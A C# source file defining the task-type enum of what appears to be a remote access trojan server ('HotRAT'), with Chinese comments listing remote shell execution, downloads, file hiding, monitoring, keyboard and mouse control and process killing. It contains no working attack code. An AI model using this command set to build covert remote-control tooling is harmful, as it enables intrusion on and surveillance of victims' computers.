namespace HotRAT.Server.Models
{
    /// <summary>
    /// 定义远程任务执行的操作类型枚举
    /// </summary>
    public enum TaskModels
    {
        /// <summary>
        /// PowerShell命令执行
        /// </summary>
        PowerShell,

        /// <summary>
        /// CMD命令执行
        /// </summary>
        Cmd,

        /// <summary>
        /// 文件下载操作
        /// </summary>
        Download,

        /// <summary>
        /// 打开指定URL
        /// </summary>
        OpenURL,

        // 文件系统操作组
        /// <summary>
        /// 创建新文件
        /// </summary>
        CreateFile,

        /// <summary>
        /// 创建新目录
        /// </summary>
        CreateFolder,

        /// <summary>
        /// 删除文件
        /// </summary>
        DelFile,

        /// <summary>
        /// 删除目录
        /// </summary>
        DelFolder,

        /// <summary>
        /// 重命名文件
        /// </summary>
        RenameFile,

        /// <summary>
        /// 重命名目录
        /// </summary>
        RenameFolder,

        /// <summary>
        /// 复制文件
        /// </summary>
        CopyFile,

        /// <summary>
        /// 复制目录
        /// </summary>
        CopyFolder,

        /// <summary>
        /// 剪切文件
        /// </summary>
        CutFile,

        /// <summary>
        /// 剪切目录
        /// </summary>
        CutFolder,

        /// <summary>
        /// 设置文件隐藏属性
        /// </summary>
        HideFile,

        /// <summary>
        /// 设置目录隐藏属性
        /// </summary>
        HideFolder,

        /// <summary>
        /// 获取文件内容
        /// </summary>
        GetFile,

        /// <summary>
        /// 获取目录内容
        /// </summary>
        GetFolder,

        // 监控操作组
        /// <summary>
        /// 开启系统监控
        /// </summary>
        StartMonitoring,

        /// <summary>
        /// 停止系统监控
        /// </summary>
        StopMonitoring,

        // 鼠标控制组
        /// <summary>
        /// 移动鼠标到指定位置
        /// </summary>
        MoveMouse,

        /// <summary>
        /// 鼠标左键点击
        /// </summary>
        LeftClick,

        /// <summary>
        /// 鼠标右键点击
        /// </summary>
        RightClick,

        /// <summary>
        /// 鼠标中键点击
        /// </summary>
        MidClick,

        // 键盘控制组
        /// <summary>
        /// 键盘按键按下
        /// </summary>
        KeyDown,

        /// <summary>
        /// 键盘按键释放
        /// </summary>
        KeyUP,

        /// <summary>
        /// 键盘按键点击（按下+释放）
        /// </summary>
        KeyClick,

        // 进程操作组
        /// <summary>
        /// 启动新进程
        /// </summary>
        StartProcess,

        /// <summary>
        /// 终止指定进程
        /// </summary>
        KillProcess,

        /// <summary>
        /// 通过PID查找进程
        /// </summary>
        SearchPID,

        /// <summary>
        /// 通过进程名查找进程
        /// </summary>
        SearchPName
    }
}